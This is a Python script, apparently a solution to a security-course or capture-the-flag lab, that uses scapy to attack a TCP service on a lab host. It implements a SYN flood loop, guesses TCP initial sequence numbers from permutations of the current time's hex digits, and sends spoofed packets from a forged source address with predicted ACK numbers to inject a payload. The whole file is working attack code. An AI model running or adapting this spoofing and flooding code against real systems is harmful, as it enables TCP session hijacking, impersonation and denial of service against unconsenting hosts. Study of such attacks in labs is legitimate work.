from itertools import permutations
from scapy.all import *
import argparse
import time
import socket
import netifaces as ni

def syn_flood(model, network_interface):
    ip_syn = IP(dst=model['dest_ip'])
    payload = model["target_ip"]
    file_object = open('output.out', 'a')
    count = 0
    try:
        while count < 10000:
            tcp_syn = TCP(sport=0, dport=model["dport"], flags="S", seq=666)
            pkt = ip_syn/tcp_syn/payload
            ans, unans = sr(pkt, multi=1, timeout=1)
            
            if len(ans) > 0:
                last_request, last_answer = ans[-1]
                seq = last_answer[TCP].seq
                ack = last_answer[TCP].ack
                # get absolute seq number
                seq = seq + len(last_answer[TCP].payload)
                file_object.write(str(seq) + "\n")
                # # 1. FIND SYN-ACK PACKET in ans and extract the seq number
                # last_request, last_answer = ans[-1]
                # seq = last_answer[TCP].seq
                # ack = last_answer[TCP].ack
                # # # 2. Send ACK packet with seq number + 1
                # ip_spoof = IP(src=model["src"], dst=model['dest_ip'])
                # tcp_spoof = TCP(sport=model["dport"], dport=model["dport"], seq=ack, ack=seq + 1, flags="A")
                # # # 3. Send payload
                # new_pkt = ip_spoof/tcp_spoof/model['target_ip']
                # send(new_pkt)
            count += 1
            time.sleep(1)
    except:
        print("Error in sending packets")
        # print exception
        print(sys.exc_info()[0])
    finally:
        file_object.close()
        print("Closing")
    return 1

def calculate_current_sequence(the_time):
    hex_string = hex(the_time).split('x')[-1]
    hex_array = [hex_string[i:i+2] for i in range(0, len(hex_string), 2)]
    perms1 = map(lambda x: int(''.join(x), 16), permutations(hex_array))
    return list(perms1)

def get_seed_syn(model, network_interface):
    ip_syn = IP(dst=model['dest_ip'])
    payload = model["target_ip"]
    tcp_syn = TCP(sport=0, dport=model["dport"], flags="S", seq=666)
    pkt = ip_syn/tcp_syn/payload
    print(pkt.summary())
    count = 0
    while count < 3:
        possible_sequence = calculate_current_sequence(int(time.time()))
        ans, unans = sr(pkt, multi=1, timeout=1)
        last_request, last_answer = ans[-1]
        seq = last_answer[TCP].seq
        lenght =  len(last_answer[TCP].payload)
        raw_seq = seq + lenght
        # get time stamp of last packet
        t = last_answer.time
        print(f'machine time {time.time()}, packet time {t}, Raw seq: {raw_seq}, lenght: {lenght}, seq: {seq}, sequences: {possible_sequence}')
        hex_string = hex(seq).split('x')[-1]
        hex_array = [hex_string[i:i+2] for i in range(0, len(hex_string), 2)]
        print('Hex seq', hex_array)
        count += 1
        time.sleep(0.2)

def spoof_tcp(model, network_interface):
    while True:
        possible_sequence = calculate_current_sequence(int(time.time()))
        ip_syn = IP(src=model['src'], dst=model['dest_ip'])
        payload = model["target_ip"]
        tcp_syn = TCP(sport=model["dport"], dport=model["dport"], flags="S", seq=0)
        pkt = ip_syn/tcp_syn/payload
        pkt.summary()
        send(pkt, iface=network_interface)
        time.sleep(2)
        seq = possible_sequence[0]
        ip_spoof = IP(src=model["src"], dst=model['dest_ip'])
        tcp_spoof = TCP(sport=model["dport"], dport=model["dport"], seq=1, ack=seq + 1, flags="A")
        
        new_pkt = ip_spoof/tcp_spoof/model['target_ip']
        del new_pkt.chksum
        
        send(new_pkt, iface=network_interface)
        print(f'Sending packet with seq {seq}')
        time.sleep(2)
    

def tcp_spoofer(model, network_interface):
    #get_seed_syn(model, network_interface)
    spoof_tcp(model, network_interface)

def main_tcp(network_interface):
    model = {
        "src": "10.2.4.10",
        "dst": "flagit.cse543.rev.fish",
        "dport": 13337,
        "target_ip": None,
        "dest_ip": None
    }
    target_ip = ni.ifaddresses(network_interface)[ni.AF_INET][0]['addr']
    dest_ip = socket.gethostbyname(model["dst"])
    model["target_ip"] = target_ip
    model["dest_ip"] = dest_ip
    print(model)
    #syn_flood(model, network_interface)
    tcp_spoofer(model, network_interface)


if __name__ == "__main__":
    network_interface = "tap0"
    main_tcp(network_interface=network_interface)
    